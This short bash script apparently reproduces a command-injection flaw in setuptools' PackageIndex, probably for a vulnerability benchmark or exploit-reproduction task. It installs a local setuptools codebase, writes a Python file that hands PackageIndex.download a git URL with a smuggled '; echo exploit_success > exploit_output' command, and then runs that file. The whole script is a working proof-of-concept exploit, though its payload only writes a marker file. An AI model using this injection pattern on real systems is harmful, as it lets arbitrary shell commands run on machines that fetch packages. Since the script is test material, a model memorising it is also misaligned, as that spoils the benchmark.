#!/bin/bash

# Install setuptools in editable mode
pip install -e ../../codebase

# Run a Python script to trigger the vulnerability by using a malicious URL
cat <<EOF > ../../codebase/trigger_exploit.py
from setuptools.package_index import PackageIndex

# Define a malicious URL that attempts to create a file
malicious_url = 'git://example.net/package-a.git; echo exploit_success > exploit_output'

# Trigger the download function with the malicious URL
package_index = PackageIndex()
package_index.download(malicious_url, '/tmp/testing')
EOF

# Execute the exploit script
python ../../codebase/trigger_exploit.py